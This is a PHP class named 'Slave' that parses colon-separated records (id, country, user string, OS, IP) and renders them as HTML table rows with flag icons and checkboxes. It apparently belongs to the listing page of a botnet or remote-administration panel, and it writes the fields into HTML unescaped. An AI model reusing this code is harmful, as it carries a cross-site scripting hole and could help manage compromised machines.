<?php
class Slave {

	public $array;

	public function makearray($s) {
		$data = explode(":", $s);
		$this->array = array(
				"id" => $data[0],
				"country" => $data[1],
				"userstring" => $data[2],
				"os" => $data[3],
				"ip" => $data[4],
		);
	}

	public function getTableFormatted($i = 0) {
		require_once "operatingsystem.php";

		$country = '<img src="images/flags/' . strtolower($this->array['country']) . '.png"> ' . $this->array['country'];
		$userstring = '<b>' . $this->array['userstring'] . '</b>';
		$os = $this->array['os'];
		$osIcon = '<img src="' . OperatingSystem::getIcon($os) . '"> ' . $os;
		$ip = $this->array['ip'];

		return "<td class=%c>" . $country . "</td>\n<td class=%c>" . $userstring . "</td>\n<td class=%c>" . $osIcon . "</td>\n<td class=%c>$ip</td>\n" . 
		"<td class=%c><input class='box' type='checkbox' name='select[$i]' value='" . $this->array['id'] . "'></td>";
	}
}